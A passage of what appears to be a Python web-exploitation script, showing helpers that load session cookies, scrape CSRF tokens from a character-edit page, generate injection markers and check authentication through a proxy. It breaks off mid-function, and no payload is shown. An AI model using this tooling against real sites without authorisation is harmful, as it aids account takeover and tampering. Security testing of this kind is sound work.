def rand_marker(prefix="DZ"):
    return prefix + secrets.token_hex(4).upper()


def b64(s):
    return base64.b64encode(s.encode()).decode()


def clean(text, limit=2200):
    if not text:
        return ""
    return re.sub(r"\s+", " ", text).strip()[:limit]


def around(text, term, before=300, after=1900):
    i = text.find(term)
    if i == -1:
        return text[:2200]
    start = max(0, i - before)
    end = min(len(text), i + after)
    return text[start:end]


def set_cookies(session, cookie_header):
    for part in cookie_header.split(";"):
        part = part.strip()
        if not part or "=" not in part:
            continue
        k, v = part.split("=", 1)
        session.cookies.set(k.strip(), v.strip())


def scrape_csrf(session, args):
    url = args.target.rstrip("/") + f"/character/{args.character_id}/edit"

    try:
        r = session.get(url, timeout=args.timeout, verify=False, proxies=PROXIES)

        patterns = [
            r'name="_csrf"\s+value="([^"]+)"',
            r'value="([^"]+)"\s+name="_csrf"',
            r"name='_csrf'\s+value='([^']+)'",
            r"value='([^']+)'\s+name='_csrf'",
            r'<meta[^>]+name=["\']csrf-token["\'][^>]+content=["\']([^"\']+)',
            r'<meta[^>]+content=["\']([^"\']+)["\'][^>]+name=["\']csrf-token["\']'
        ]

        for pat in patterns:
            m = re.search(pat, r.text, re.I)
            if m:
                return m.group(1)

        print(f"[-] CSRF token not found on {url}")
        print(f"    status={r.status_code}")
        print(f"    snippet={clean(r.text, 500)}")

    except Exception as e:
        print(f"[-] CSRF scrape failed: {e}")

    return args.csrf


def get_csrf(session, args, force=False):
    if args.csrf and not force:
        return args.csrf

    if force or not getattr(args, "_csrf_cache", None):
        args._csrf_cache = scrape_csrf(session, args)

    return args._csrf_cache


def check_auth(session, args):
    try:
        r = session.get(
            args.target.rstrip("/") + "/dashboard",
            timeout=args.timeout,
            verify=False,
            proxies=PROXIES
        )

        print(f"[*] Auth check /dashboard :: status={r.status_code}")

        if "logout" in r.text.lower():
            m = re.search(r'<span class="user-greeting">\s*—\s*([^<]+?)\s*</span>', r.text)
            if m:
                print(f"[+] Authenticated as: {m.group(1)}")
            else:
